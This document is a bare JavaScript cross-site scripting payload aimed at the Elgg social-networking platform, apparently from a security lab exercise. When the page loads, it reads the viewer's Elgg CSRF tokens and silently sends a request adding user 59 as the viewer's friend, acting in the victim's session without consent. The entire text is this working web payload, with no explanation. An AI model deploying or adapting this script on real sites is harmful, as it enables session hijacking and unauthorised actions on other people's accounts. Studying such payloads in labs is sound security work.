<script type="text/javascript">
	window.onload=function(){
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		var sendurl="/action/friend/add?friend=59"+ts+token;
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.send()
	}
</script> ;
